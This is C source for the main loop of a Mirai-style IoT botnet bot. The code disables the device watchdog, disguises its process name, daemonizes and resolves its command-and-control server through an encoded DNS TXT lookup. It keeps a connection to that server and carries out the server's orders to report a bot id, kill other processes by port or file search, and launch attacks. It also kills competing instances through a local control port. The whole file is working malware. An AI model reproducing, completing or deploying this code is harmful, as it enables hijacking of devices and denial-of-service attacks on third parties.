#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "util.h"
#include "encode.h"
#include "rand.h"
#include "attack.h"
#include "killer.h"
#include "domain.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, fd_watchdog = 0, bind_fd = 0, rebind_pid = -1;
char pending_connection = 0;

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

static void resolve_cnc_addr(void)
{
	struct resolv_entries *entries;
    char txtrecord[128];

	enc_retrive(ENC_MAIN_TXT, txtrecord);
	entries = resolv_lookup(txtrecord);
	if (entries == NULL)
		return;

	srv_addr.sin_family = AF_INET;
	srv_addr.sin_port = htons(18191);
	srv_addr.sin_addr.s_addr = entries->addrs[rand_real() % entries->addrs_len];
    resolv_entries_free(entries);
}

static void establish_connection(void)
{
#ifdef DEBUG
    printf("[main] Attempting to connect to CNC\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[main] Failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

	resolve_cnc_addr();
    pending_connection = 1;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}

int main(int argc, char **args)
{
    char botid[32], wdog_one[64], wdog_two[64];
    int pgid, pings = 0, tmp = 1;

    util_memset(botid, 0, sizeof(botid));
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(botid, args[1]);
        util_memset(args[1], 0, util_strlen(args[1]));
    }
    
    signal(SIGCHLD, SIG_IGN);
    enc_init();
    rand_seed();

    enc_retrive(ENC_WATCHDOG_ONE, wdog_one);
    enc_retrive(ENC_WATCHDOG_TWO, wdog_two);

	if ((fd_watchdog = open(wdog_one, 2)) != -1)
	{
		ioctl(fd_watchdog, 0x80045704, &tmp);
        close(fd_watchdog);
	}
	else if ((fd_watchdog = open(wdog_two, 2)) != -1)
	{
		ioctl(fd_watchdog, 0x80045704, &tmp);
	    close(fd_watchdog);
	}

    util_memset(wdog_one, 0, sizeof(wdog_one));
    util_memset(wdog_two, 0, sizeof(wdog_two));

	ensure_single_instance();

    util_memset(args[0], rand() % 32, sizeof(args[0]));
    prctl(PR_SET_NAME, args[0]);

    char execmsg[16];
    enc_retrive(ENC_EXEC_MSG, execmsg);

    write(1, execmsg, util_strlen(execmsg));
    write(1, "\n", 1);
    util_memset(execmsg, 0, sizeof(execmsg));

#ifndef DEBUG
    if (fork() > 0)
        return 0;

    pgid = setsid();
    close(0);
    close(1);
    close(2);
#endif

	attack_load_all();

    while (1)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetrd);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
#endif
            kill(pgid * -1, 9);
            exit(0);
        }

        // Check if CNC connection was established or timed out or errored
        if (pending_connection)
        {
            pending_connection = 0;

            if (!FD_ISSET(fd_serv, &fdsetrd))
            {
#ifdef DEBUG
                printf("[main] Timed out while connecting to CNC\n");
#endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf("[main] Error while connecting to CNC code=%d\n", err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_real() % 10) + 1);
                }
                else
                {
#ifdef DEBUG
                    printf("[main] Connected to CNC\n");
#endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            char rdbuf[256];
            uint8_t len;

            if ((len = recv(fd_serv, rdbuf, sizeof(rdbuf), MSG_NOSIGNAL)) <= 0)
            {
                if (errno != EWOULDBLOCK || errno != EAGAIN || errno != EINTR)
                {
#ifdef DEBUG
                    printf("[main] lost connection to cnc, reconnecting\n");
#endif
                    teardown_connection();
                }
                continue;
            }

            if (len == 6)
            {
                send(fd_serv, "\x45\x48", 2, MSG_NOSIGNAL);
                    
                if (util_strlen(botid) >= 1)
                    send(fd_serv, botid, util_strlen(botid), MSG_NOSIGNAL);
                else
                    send(fd_serv, "nil", 3, MSG_NOSIGNAL);

                send(fd_serv, "\n", 1, MSG_NOSIGNAL);
                util_memset(rdbuf, 0, sizeof(rdbuf));
                continue;
            }

            if (rdbuf[0] == '\x34' && rdbuf[6] == '\x38')
            {
                char portstr[32];
                int port = 0;

                util_strcpy(portstr, rdbuf + 7);
                port = util_atoi(portstr, 10);

                killer_kill_by_port(htons(port));
                util_memset(portstr, 0, sizeof(portstr));
                util_memset(rdbuf, 0, sizeof(rdbuf));
                port = 0;
                continue;
            }
            
            if (rdbuf[0] == '\x08' && rdbuf[6] == '\x76')
            {
                int argument_count, i = 0;
                char inbuf[128], file[32], search[128], **arguments;
                util_strcpy(inbuf, rdbuf + 7);

                argument_count = util_split(inbuf, ' ', &arguments);
                for (i = 0; i < argument_count; i++)
                {
                    if (i == 0)
                        util_strcpy(file, arguments[0]);
                    else if (i == 1)
                        util_strcpy(search, arguments[1]);
                }

                if (util_strlen(file) >= 1 && util_strlen(search) >= 1)
                    killer_init(file, search);

                for (i = 0; i < argument_count; i++) 
                    free(arguments[i]);

                free(arguments);
                argument_count = 0;
                util_memset(inbuf, 0, sizeof(inbuf));
                util_memset(rdbuf, 0, sizeof(rdbuf));
                util_memset(file, 0, sizeof(file));
                util_memset(search, 0, sizeof(search));
                continue;
            }

#ifdef DEBUG
            printf("[main] command received from cnc %d\n", len);
#endif
            attack_read(rdbuf, len);
            util_memset(rdbuf, 0, sizeof(rdbuf));
        }
    }

    return 0;
}

static void teardown_connection(void)
{
#ifdef DEBUG
    printf("[main] Tearing down connection to CNC!\n");
#endif

    if (fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    sleep(1);
}

static void ensure_single_instance(void)
{
    static char local_bind = 1;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : util_local_addr();
    addr.sin_port = htons(18945);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = 0;
#ifdef DEBUG
        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(18945);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
#endif
        }

        close(fd_ctrl);
        killer_kill_by_port(htons(18945));
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            killer_kill_by_port(htons(18945));
            ensure_single_instance();
#endif
        }
#ifdef DEBUG
        printf("[main] We are the only process on this system!\n");
#endif
    }
}
